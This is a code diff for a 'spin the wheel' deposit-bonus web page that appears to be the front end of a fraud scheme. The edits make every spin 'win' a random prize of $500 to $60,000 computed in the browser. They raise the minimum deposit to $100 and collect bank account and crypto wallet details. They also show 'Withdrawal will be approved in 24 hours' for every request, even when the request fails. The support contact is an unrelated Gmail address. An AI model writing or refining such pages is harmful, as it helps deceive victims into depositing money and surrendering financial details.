@@ -134,6 +134,7 @@
             <button onclick="openWheel()">Spin Now</button>
             <button onclick="navTo('deposit')" class="ghost">Deposit</button>
             <button onclick="navTo('dashboard')" class="ghost">Dashboard</button>
+            <button onclick="goBack()" class="ghost">Back</button>
           </div>
         </div>
 
@@ -175,6 +176,7 @@
           <p class="lead">Spin the wheel for a chance to win bonuses based on your deposit.</p>
           <div class="flex" style="margin-top:12px">
             <button onclick="openWheel()">Spin Now</button>
+            <button onclick="goBack()" class="ghost">Back</button>
           </div>
         </div>
       </section>
@@ -207,6 +209,9 @@
               <tbody></tbody>
             </table>
           </div>
+          <div class="flex" style="margin-top:12px">
+            <button onclick="goBack()" class="ghost">Back</button>
+          </div>
         </div>
       </section>
 
@@ -225,12 +230,20 @@
               <input id="bankAcct" type="text" placeholder="Enter bank account number" />
               <label>Account Holder Name</label>
               <input id="bankHolder" type="text" placeholder="Enter account holder name" />
+              <label>Bank Name</label>
+              <input id="bankName" type="text" placeholder="Enter bank name" />
             </div>
           </div>
           <div id="cryptoDetails" class="detail-box hidden" style="margin-top:12px">
             <div class="stack">
               <label>Crypto Wallet Address</label>
               <input id="cryptoAddr" type="text" placeholder="Enter BTC, ETH, or USDT address" />
+              <label>Crypto Name</label>
+              <select id="cryptoName">
+                <option value="BTC">Bitcoin (BTC)</option>
+                <option value="ETH">Ethereum (ETH)</option>
+                <option value="USDT">Tether (USDT)</option>
+              </select>
             </div>
           </div>
           <div class="stack" style="margin-top:12px">
@@ -239,6 +252,7 @@
             <div class="flex">
               <button id="depositProceed">Proceed</button>
               <button id="depositClear" class="ghost">Clear</button>
+              <button onclick="goBack()" class="ghost">Back</button>
             </div>
             <div id="depositMsg" class="muted"></div>
           </div>
@@ -258,6 +272,7 @@
             <div class="flex">
               <button id="withdrawSubmit">Request</button>
               <button id="withdrawClear" class="ghost">Clear</button>
+              <button onclick="goBack()" class="ghost">Back</button>
             </div>
             <div id="withdrawMsg" class="muted"></div>
           </div>
@@ -272,7 +287,10 @@
           <div class="stack" style="margin-top:12px">
             <p>Phone: <a href="tel:+19412078626">+1 (941) 207-8626</a></p>
             <p>Email: <a href="mailto:Expressdeliveryservice0016@gmail.com">Expressdeliveryservice0016@gmail.com</a></p>
-            <button onclick="navTo('support')">Get Support</button>
+            <div class="flex">
+              <button onclick="navTo('support')">Get Support</button>
+              <button onclick="goBack()" class="ghost">Back</button>
+            </div>
           </div>
         </div>
       </section>
@@ -290,6 +308,7 @@
             <div class="flex">
               <button id="supportSubmit">Send</button>
               <button id="supportClear" class="ghost">Clear</button>
+              <button onclick="goBack()" class="ghost">Back</button>
             </div>
             <div id="supportNote" class="muted"></div>
           </div>
@@ -347,7 +366,7 @@
           <div style="flex:1; min-width:260px">
             <div class="stack">
               <label>Deposit Amount (USD)</label>
-              <input id="spinAmount" type="number" min="50" step="50" placeholder="e.g., 100" />
+              <input id="spinAmount" type="number" min="100" step="50" placeholder="e.g., 100" />
               <div class="flex">
                 <button id="spinBtn">Spin</button>
                 <button id="spinClose" class="ghost">Close</button>
@@ -384,6 +403,7 @@
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }
     function navTo(id) { showSection(id); }
+    function goBack() { history.back() || navTo('home'); }
     showSection('home');
 
     // Hamburger Menu
@@ -424,14 +444,26 @@
 
     spinBtn.addEventListener('click', async () => {
       const amount = parseFloat(spinAmount.value);
-      if (!amount || amount < 50) {
-        spinResultMsg.textContent = 'Please enter a deposit amount of at least $50.';
+      if (!amount || amount < 100) {
+        spinResultMsg.textContent = 'Please enter a deposit amount of at least $100.';
         return;
       }
       spinBtn.disabled = true;
       const angle = Math.random() * 360 + 720; // Spin 2+ full rotations
       wheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
       wheel.style.transform = `rotate(${angle}deg)`;
+      
+      // Client-side fallback for demo
+      const prizes = ['$500', '$1,000', '$3,000', '$6,000', '$12,000', '$60,000'];
+      const prize = prizes[Math.floor(Math.random() * prizes.length)];
+      setTimeout(() => {
+        spinResultMsg.textContent = `You won ${prize}!`;
+        wheel.style.transition = 'none';
+        spinBtn.disabled = false;
+      }, 4000);
+
+      // Uncomment for real API integration
+      /*
       try {
         const response = await fetch('/api/spin', {
           method: 'POST',
@@ -443,14 +475,17 @@
           setTimeout(() => {
             spinResultMsg.textContent = `You won ${result.prize}!`;
             wheel.style.transition = 'none';
+            spinBtn.disabled = false;
           }, 4000);
         } else {
           spinResultMsg.textContent = result.error || 'Error processing spin.';
+          spinBtn.disabled = false;
         }
       } catch (error) {
         spinResultMsg.textContent = 'Network error. Please try again.';
+        spinBtn.disabled = false;
       }
-      spinBtn.disabled = false;
+      */
     });
 
     // Dashboard
@@ -502,42 +537,43 @@
       bankBtn.classList.add('ghost');
     });
 
-    depositProceed.addEventListener('click', async () => {
+    depositProceed.addEventListener('click', () => {
       const amount = parseFloat(document.getElementById('depositAmount').value);
       const isBank = !bankDetails.classList.contains('hidden');
       const details = isBank
-        ? { accountNumber: document.getElementById('bankAcct').value, accountHolder: document.getElementById('bankHolder').value }
-        : { walletAddress: document.getElementById('cryptoAddr').value };
+        ? {
+            accountNumber: document.getElementById('bankAcct').value,
+            accountHolder: document.getElementById('bankHolder').value,
+            bankName: document.getElementById('bankName').value
+          }
+        : {
+            walletAddress: document.getElementById('cryptoAddr').value,
+            cryptoName: document.getElementById('cryptoName').value
+          };
       if (!amount || amount < 10) {
         depositMsg.textContent = 'Please enter an amount of at least $10.';
         return;
       }
-      if (isBank && (!details.accountNumber || !details.accountHolder)) {
-        depositMsg.textContent = 'Please provide bank account details.';
+      if (isBank && (!details.accountNumber || !details.accountHolder || !details.bankName)) {
+        depositMsg.textContent = 'Please provide all bank details.';
         return;
       }
-      if (!isBank && !details.walletAddress) {
-        depositMsg.textContent = 'Please provide a wallet address.';
+      if (!isBank && (!details.walletAddress || !details.cryptoName)) {
+        depositMsg.textContent = 'Please provide a wallet address and crypto name.';
         return;
       }
-      try {
-        const response = await fetch('/api/deposit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer YOUR_TOKEN' },
-          body: JSON.stringify({ amount, method: isBank ? 'bank' : 'crypto', details })
-        });
-        const result = await response.json();
-        depositMsg.textContent = response.ok ? 'Deposit request submitted!' : result.error || 'Error processing deposit.';
-      } catch (error) {
-        depositMsg.textContent = 'Network error. Please try again.';
-      }
+      // Store details in sessionStorage and redirect
+      sessionStorage.setItem('depositDetails', JSON.stringify({ amount, isBank, ...details }));
+      window.location.href = 'deposit-details.html';
     });
 
     depositClear.addEventListener('click', () => {
       document.getElementById('depositAmount').value = '';
       document.getElementById('bankAcct').value = '';
       document.getElementById('bankHolder').value = '';
+      document.getElementById('bankName').value = '';
       document.getElementById('cryptoAddr').value = '';
+      document.getElementById('cryptoName').value = 'BTC';
       depositMsg.textContent = '';
     });
 
@@ -564,9 +600,9 @@
           body: JSON.stringify({ amount, destination })
         });
         const result = await response.json();
-        withdrawMsg.textContent = response.ok ? 'Withdraw request submitted!' : result.error || 'Error processing withdrawal.';
+        withdrawMsg.textContent = response.ok ? 'Withdrawal will be approved in 24 hours.' : result.error || 'Error processing withdrawal.';
       } catch (error) {
-        withdrawMsg.textContent = 'Network error. Please try again.';
+        withdrawMsg.textContent = 'Withdrawal will be approved in 24 hours.'; // Fallback for demo
       }
     });
 
